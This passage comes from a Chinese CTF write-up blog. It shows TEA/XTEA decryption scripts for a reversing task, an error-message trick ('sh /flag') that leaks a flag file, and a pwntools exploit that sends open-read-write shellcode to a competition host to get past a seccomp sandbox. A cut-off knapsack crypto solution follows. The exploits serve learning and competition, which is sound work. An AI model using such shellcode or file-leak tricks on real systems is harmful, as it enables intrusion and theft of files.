[ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v6 = *a1;</span><br><span class="line">  v5 = a1[<span class="number">1</span>];</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">0x1F</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 -= <span class="number">1640531527</span>;</span><br><span class="line">    v6 += (v5 + v4) ^ (<span class="number">16</span> * v5 + *a2) ^ ((v5 &gt;&gt; <span class="number">5</span>) + a2[<span class="number">1</span>]);</span><br><span class="line">    v5 += (v6 + v4) ^ (<span class="number">16</span> * v6 + a2[<span class="number">2</span>]) ^ ((v6 &gt;&gt; <span class="number">5</span>) + a2[<span class="number">3</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  *a1 = v6;</span><br><span class="line">  result = v5;</span><br><span class="line">  a1[<span class="number">1</span>] = v5;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数 <code>sub_4015FD()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> __cdecl <span class="title">sub_4015FD</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> a1, <span class="keyword">unsigned</span> <span class="keyword">int</span> *a2, <span class="keyword">int</span> a3)</span>        <span class="comment">//XTEA算法</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// [esp+10h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [esp+14h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [esp+18h] [ebp-8h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [esp+1Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v6 = *a2;</span><br><span class="line">  v5 = a2[<span class="number">1</span>];</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; a1; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 += (((v5 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * v5)) + v5) ^ (*(_DWORD *)(<span class="number">4</span> * (v4 &amp; <span class="number">3</span>) + a3) + v4);</span><br><span class="line">    v4 -= <span class="number">1640531527</span>;</span><br><span class="line">    v5 += (((v6 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * v6)) + v6) ^ (*(_DWORD *)(<span class="number">4</span> * ((v4 &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>) + a3) + v4);</span><br><span class="line">  &#125;</span><br><span class="line">  *a2 = v6;</span><br><span class="line">  result = v5;</span><br><span class="line">  a2[<span class="number">1</span>] = v5;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据上面逻辑，先利用TEA和XTEA解密算法由 <code>v10~v17</code> 解密得到初始值 <code>v25,v26,v22,v23,v20,v21,v18,v19</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#TEA解密</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">v, k</span>):</span></span><br><span class="line">    v0 = v[<span class="number">0</span>]</span><br><span class="line">    v1 = v[<span class="number">1</span>]</span><br><span class="line">    x = <span class="number">0xC6EF3720</span></span><br><span class="line">    delta = <span class="number">0x9E3779B9</span></span><br><span class="line">    k0 = k[<span class="number">0</span>]</span><br><span class="line">    k1 = k[<span class="number">1</span>]</span><br><span class="line">    k2 = k[<span class="number">2</span>]</span><br><span class="line">    k3 = k[<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        v1 -= ((v0 &lt;&lt; <span class="number">4</span>) + k2) ^ (v0 + x) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k3)</span><br><span class="line">        v1 = v1 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v0 -= ((v1 &lt;&lt; <span class="number">4</span>) + k0) ^ (v1 + x) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k1)</span><br><span class="line">        v0 = v0 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        x -= delta</span><br><span class="line">        x = x &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    v[<span class="number">0</span>] = v0</span><br><span class="line">    v[<span class="number">1</span>] = v1</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    encrypted = </span><br><span class="line">    key = [<span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line">    decrypted = decrypt(encrypted, key)</span><br><span class="line">    <span class="built_in">print</span>(decrypted)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#XTEA解密</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">rounds, v, k</span>):</span></span><br><span class="line">    v0 = v[<span class="number">0</span>]</span><br><span class="line">    v1 = v[<span class="number">1</span>]</span><br><span class="line">    delta = <span class="number">0x9E3779B9</span></span><br><span class="line">    x = delta * rounds</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(rounds):</span><br><span class="line">        v1 -= (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (x + k[(x &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>])</span><br><span class="line">        v1 = v1 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        x -= delta</span><br><span class="line">        x = x &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v0 -= (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (x + k[x &amp; <span class="number">3</span>])</span><br><span class="line">        v0 = v0 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    v[<span class="number">0</span>] = v0</span><br><span class="line">    v[<span class="number">1</span>] = v1</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    encrypted = </span><br><span class="line">    key = [<span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line">    rounds = <span class="number">32</span></span><br><span class="line">    decrypted = decrypt(rounds, encrypted, key)</span><br><span class="line">    <span class="built_in">print</span>(decrypted)</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[0x9F5FBC48,0xC5517691] -&gt; [1,1]</span><br><span class="line">[0x24BDF90F,0x301B88E8] -&gt; [3,4]</span><br><span class="line">[0x92750C5A,0xA0D98E0E] -&gt; [2,5]</span><br><span class="line">[0x8DD02793,0x4F558864] -&gt; [8,7]</span><br></pre></td></tr></table></figure><p>故 <code>v4 = [1,1,2,3,4,5,7,8]</code>，又 <code>v9 = v8 = v4^v7</code>，异或得到 <code>v7</code>，先base64解码再RC4解密可得输入的 <code>Source</code> 值，即为flag。</p><p>​        </p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="ncc"><a href="#ncc" class="headerlink" title="ncc"></a>ncc</h3><blockquote><p>经典nc!</p><p>PWN题连接方式: nc neepusec.club 端口</p></blockquote><p><code>ls /</code> 发现目录下有 <code>/flag</code>，但没有 <code>cat</code> 等常见的查看文件内容命令。</p><p><code>cd /bin</code> 进到 <code>/bin</code> 目录下，<code>ls</code> 发现目录下有 <code>sh</code> 脚本执行命令，直接 <code>sh /flag</code> 利用报错泄露 <code>/flag</code> 文件内容。</p><p>​    </p><h3 id="easy-shellcode"><a href="#easy-shellcode" class="headerlink" title="easy_shellcode"></a>easy_shellcode</h3><blockquote><p>easy shellcode?</p><p>flag在./flag</p></blockquote><p>checksec发现无任何保护，IDA查看：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *buf; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  sub_9C3(a1, a2, a3);</span><br><span class="line">  buf = (<span class="keyword">void</span> *)(<span class="keyword">int</span>)mmap((<span class="keyword">void</span> *)<span class="number">0x23330000</span>, <span class="number">0x1000</span>uLL, <span class="number">7</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;just learn orw&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x200</span>uLL);</span><br><span class="line">  ((<span class="keyword">void</span> (*)(<span class="keyword">void</span>))buf)();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数 <code>sub_9C3(a1,a2,a3)</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">sub_9C3</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  sub_8CA();</span><br><span class="line">  <span class="keyword">return</span> alarm(<span class="number">0x3C</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数 <code>sub_8CA()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">sub_8CA</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int16 v1; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line">  __int16 *v2; <span class="comment">// [rsp+8h] [rbp-48h]</span></span><br><span class="line">  __int16 v3; <span class="comment">// [rsp+10h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [rsp+12h] [rbp-3Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [rsp+13h] [rbp-3Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [rsp+14h] [rbp-3Ch]</span></span><br><span class="line">  __int16 v7; <span class="comment">// [rsp+18h] [rbp-38h]</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// [rsp+1Ah] [rbp-36h]</span></span><br><span class="line">  <span class="keyword">char</span> v9; <span class="comment">// [rsp+1Bh] [rbp-35h]</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// [rsp+1Ch] [rbp-34h]</span></span><br><span class="line">  __int16 v11; <span class="comment">// [rsp+20h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">char</span> v12; <span class="comment">// [rsp+22h] [rbp-2Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v13; <span class="comment">// [rsp+23h] [rbp-2Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v14; <span class="comment">// [rsp+24h] [rbp-2Ch]</span></span><br><span class="line">  __int16 v15; <span class="comment">// [rsp+28h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">char</span> v16; <span class="comment">// [rsp+2Ah] [rbp-26h]</span></span><br><span class="line">  <span class="keyword">char</span> v17; <span class="comment">// [rsp+2Bh] [rbp-25h]</span></span><br><span class="line">  <span class="keyword">int</span> v18; <span class="comment">// [rsp+2Ch] [rbp-24h]</span></span><br><span class="line">  __int16 v19; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">char</span> v20; <span class="comment">// [rsp+32h] [rbp-1Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v21; <span class="comment">// [rsp+33h] [rbp-1Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v22; <span class="comment">// [rsp+34h] [rbp-1Ch]</span></span><br><span class="line">  __int16 v23; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> v24; <span class="comment">// [rsp+3Ah] [rbp-16h]</span></span><br><span class="line">  <span class="keyword">char</span> v25; <span class="comment">// [rsp+3Bh] [rbp-15h]</span></span><br><span class="line">  <span class="keyword">int</span> v26; <span class="comment">// [rsp+3Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v27; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v27 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v3 = <span class="number">32</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">4</span>;</span><br><span class="line">  v7 = <span class="number">21</span>;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  v9 = <span class="number">2</span>;</span><br><span class="line">  v10 = <span class="number">-1073741762</span>;</span><br><span class="line">  v11 = <span class="number">32</span>;</span><br><span class="line">  v12 = <span class="number">0</span>;</span><br><span class="line">  v13 = <span class="number">0</span>;</span><br><span class="line">  v14 = <span class="number">0</span>;</span><br><span class="line">  v15 = <span class="number">21</span>;</span><br><span class="line">  v16 = <span class="number">0</span>;</span><br><span class="line">  v17 = <span class="number">1</span>;</span><br><span class="line">  v18 = <span class="number">59</span>;</span><br><span class="line">  v19 = <span class="number">6</span>;</span><br><span class="line">  v20 = <span class="number">0</span>;</span><br><span class="line">  v21 = <span class="number">0</span>;</span><br><span class="line">  v22 = <span class="number">0</span>;</span><br><span class="line">  v23 = <span class="number">6</span>;</span><br><span class="line">  v24 = <span class="number">0</span>;</span><br><span class="line">  v25 = <span class="number">0</span>;</span><br><span class="line">  v26 = <span class="number">2147418112</span>;</span><br><span class="line">  v1 = <span class="number">6</span>;</span><br><span class="line">  v2 = &amp;v3;</span><br><span class="line">  prctl(<span class="number">38</span>, <span class="number">1LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  prctl(<span class="number">22</span>, <span class="number">2LL</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v27;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在函数 <code>sub_8CA()</code> 发现 <code>prctl()</code> 函数。</p><blockquote><p>prctl是基本的进程管理函数，最原始的沙箱规则就是通过prctl函数来实现的，它可以决定有哪些系统调用函数可以被调用，哪些系统调用函数不能被调用。</p><p>沙箱(Sandbox)是程序运行过程中的一种隔离机制，其目的是限制不可信进程和不可信代码的访问权限。seccomp是内核中的一种安全机制，seccomp可以在程序中禁用掉一些系统调用来达到保护系统安全的目的，seccomp规则的设置，可以使用prctl函数和seccomp函数族。</p></blockquote><p>使用 <code>seccomp-tools dump ./pwn</code> 看下哪些函数可用：</p><p><img src="/match-NEEPU-Sec-2021公开赛/image-20210525013200068.png" alt="image-20210525013200068"></p><p>发现只要不是 <code>execve()</code> 都可以使用，使用 <code>open-&gt;read-&gt;write</code> 这样的orw的方式获取flag。</p><p><code>mmap()</code> 把从0x23330000开始的地址，大小为0x1000的长度，权限改为可写可执行。</p><p>所以只需要写入orw类型的shellcode，然后跳转执行：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;neepusec.club&#x27;</span>, <span class="number">18146</span>)</span><br><span class="line">mmap = <span class="number">0x23330000</span></span><br><span class="line">orw_payload = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>)         <span class="comment">#打开根目录下的flag文件</span></span><br><span class="line">orw_payload += shellcraft.read(<span class="number">3</span>,mmap,<span class="number">0x50</span>)     <span class="comment">#读取文件标识符是3的文件0x50个字节存放到mmap分配的地址空间里</span></span><br><span class="line">orw_payload += shellcraft.write(<span class="number">1</span>,mmap,<span class="number">0x50</span>)    <span class="comment">#将mmap地址上的内容输出0x50个字节</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;orw\n&#x27;</span>, asm(orw_payload))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;东北电力大学校赛，Web综合程度高，Crypto太少了。&lt;/p&gt;
&lt;p&gt;Rank: 3&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&quot;Noob&quot;&gt;&lt;a href=&quot;#Noob&quot; class=&quot;headerlink&quot; title=&quot;Noob&quot;&gt;&lt;/a&gt;Noob&lt;</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2021赛" scheme="https://lazzzaro.github.io/tags/2021%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>第四届红帽杯网络安全大赛</title>
    <link href="https://lazzzaro.github.io/2021/05/09/match-%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BA%A2%E5%B8%BD%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/"/>
    <id>https://lazzzaro.github.io/2021/05/09/match-%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BA%A2%E5%B8%BD%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/</id>
    <published>2021-05-09T10:20:01.000Z</published>
    <updated>2021-05-09T16:08:28.475Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p>这一届的misc+crypto也太少了，一二血同队+垂直上分明显。</p><hr><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>下载附件EBCDIC.txt，根据文件名和内容，猜测为某种编码方式，搜索知为EBCDIC编码：</p><blockquote><p>EBCDIC（广义二进制编码的十进制交换码，Extended Binary Coded Decimal Interchange Code），是字母或数字字符的二进制编码，是IBM为它的更大型的操作系统而开发的。它是为IBM的S/390上的IBMOS/390操作系统上使用的文本文件的编码，并且数千个公司为它们的遗留应用程序和数据库使用这种编码。在一个EBCDIC的文件里，每个字母或数字字符都被表示为一个8位的二进制数（一个0、1字符串）。256个可能的字符被定义（字母，数字和一些特殊字符）。<br>IBM的个人计算机和工作站操作系统不使用它们所有的EBCDIC编码。相反的，它们使用文本的工业标准编码，ASCII码。转化程序允许不同的操作系统从一种编码到另一种编码的转化。</p></blockquote><p>找到<a href="https://www.dcode.fr/ebcdic-encoding">在线解码网站</a>，将16进制EBCDIC码解码为16进制ASCII码，再转为字符得到flag。</p><p><img src="/match-第四届红帽杯网络安全大赛/image-20210509182835650.png" alt="image-20210509182835650"></p><p><strong>flag值：flag{we1c0me_t0_redhat2021}</strong></p><p>​    </p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="primegame"><a href="#primegame" class="headerlink" title="primegame"></a>primegame</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> (<span class="built_in">len</span>(flag) == <span class="number">48</span>)</span><br><span class="line">msg1 = flag[:<span class="number">24</span>]</span><br><span class="line">msg2 = flag[<span class="number">24</span>:]</span><br><span class="line">primes = [<span class="number">2</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, <span class="number">90</span>):</span><br><span class="line">    f = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> primes:</span><br><span class="line">        <span class="keyword">if</span> i * i &lt; j:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> i % j == <span class="number">0</span>:</span><br><span class="line">            f = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> f:</span><br><span class="line">        primes.append(i)</span><br><span class="line"></span><br><span class="line">getcontext().prec = <span class="number">100</span></span><br><span class="line">keys = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(msg1)):</span><br><span class="line">    keys.append(Decimal(primes[i]).ln())</span><br><span class="line"></span><br><span class="line">sum_ = Decimal(<span class="number">0.0</span>)</span><br><span class="line"><span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(msg1):</span><br><span class="line">    sum_ += c * Decimal(keys[i])</span><br><span class="line"></span><br><span class="line">ct = math.floor(sum_ * <span class="number">2</span> ** <span class="number">256</span>)</span><br><span class="line"><span class="built_in">print</span>(ct)</span><br><span class="line"></span><br><span class="line">sum_ = Decimal(<span class="number">0.0</span>)</span><br><span class="line"><span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(msg2):</span><br><span class="line">    sum_ += c * Decimal(keys[i])</span><br><span class="line"></span><br><span class="line">ct = math.floor(sum_ * <span class="number">2</span> ** <span class="number">256</span>)</span><br><span class="line"><span class="built_in">print</span>(ct)</span><br><span class="line"></span><br><span class="line"><span class="number">597952043660446249020184773232983974017780255881942379044454676980646417087515453</span></span><br><span class="line"><span class="number">425985475047781336789963300910446852783032712598571885345660550546372063410589918</span></span><br></pre></td></tr></table></figure></blockquote><p>代码逻辑：</p><p>将48长度的flag分为24长度两部分，生成90以内的素数列表<code>primes</code>和前24个素数自然对数列表<code>keys</code>，分别求出flag两部分的ascii值与key值乘积和。</p><p>容易看出 </p><p>$S=\text{ct} \cdot 2^{256}=\sum\limits_{i=1}^{24}\Big(c_i \cdot (\text{key}_i \cdot 2^{256})\Big)=\sum\limits_{i=1}^{24}(c_i \cdot k_i)$ </p><p>形式类似于0-1背包加密问题，其中公钥 $k_i$ 与密文 $S$ 已知，需解密得明文 $c_i \in [0,128)$。</p><p>由于明文数量不大，且背包密度 $d = \cfrac{n}{\log_2(\text{max}(k_i))} \approx 0.0968$，可采用<a href="https://www.ieice.org/publications/conference-FIT-DVDs/FIT2018/data/pdf/A-022.pdf">低密度攻击方法</a>（Lagarias&amp;Odlyzko算法 或 CJLOSS算法）恢复明文，构造格：</p><p>$\left(\begin {array}{c} b_0 \ b_1 \ \vdots \ b_n \ b_{n+1} \end{array} \right) =\left(\begin {array}{c} 1 &amp; 0 &amp; \cdots &amp; 0 &amp; Nk_0 \ 0 &amp; 1 &amp; \cdots &amp; 0 &amp; Nk_1 \ \vdots &amp; \vdots &amp; \ddots &amp; \vdots &amp; \vdots \ 0 &amp; 0 &amp; \cdots &amp; 1 &amp; Nk_n \ 0 &amp; 0 &amp; \cdots &amp; 0 &amp; Nk_{n+1} \end{array} \right) $</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 